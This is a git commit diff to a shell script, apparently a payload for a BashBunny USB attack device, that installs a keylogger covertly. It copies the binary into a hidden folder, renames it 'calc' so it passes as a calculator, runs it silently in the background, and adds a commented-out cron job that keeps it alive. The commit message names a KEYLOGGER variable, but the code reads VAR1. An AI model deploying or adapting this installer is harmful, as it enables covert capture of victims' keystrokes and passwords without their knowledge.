d68a7cce363d4d2574aa862497250b7e2847ceb0
Brannon Dorsey <brannon@brannondorsey.com>
2017-04-07 16:24:51 -0500

    Fix shebang, copy path for keylogger binary can now be set with KEYLOGGER env var in install_keylogger.sh

--- install_keylogger.sh
+++ install_keylogger.sh
@@ -1,14 +1,21 @@
-#!bin/bash
+#!/bin/bash
 # hide in plain site
+
 INSTALL_DIR="/home/$USER/.linux-calculator"
 BIN_NAME="calc"
 SWITCH=switch1
 
+# path to keylogger binary can be overwritten with env variable
+KEYLOGGER="${VAR1:-/media/$USER/BashBunny/payloads/$SWITCH/keylogger}"
+
 # copy the keylogger from the BashBunny to the $INSTALL_DIR
 mkdir -p "$INSTALL_DIR"
-cp "/media/$USER/BashBunny/payloads/$SWITCH/keylogger" "$INSTALL_DIR/"
+cp "$KEYLOGGER" "$INSTALL_DIR/"
 mv "$INSTALL_DIR/keylogger" "$INSTALL_DIR/$BIN_NAME"
 chmod +x "$INSTALL_DIR/$BIN_NAME" # make sure the bin has the right permissions 
+
+# add crontab to start keylogger if it isn't running
+# crontab -l -u $USER | echo "* * * * * bash -c \"ps -aux | grep \\\"keylogger\\\" > /dev/null 2>&1 ; if [[ \\\"\$?\\\" != \\\"0\\\" ]]; then \\\"$INSTALL_DIR/$BIN_NAME\\\" &>/dev/null & fi\"" | crontab -u $USER -
 
 # run the logger in the background
 exec "$INSTALL_DIR/$BIN_NAME" &>/dev/null &
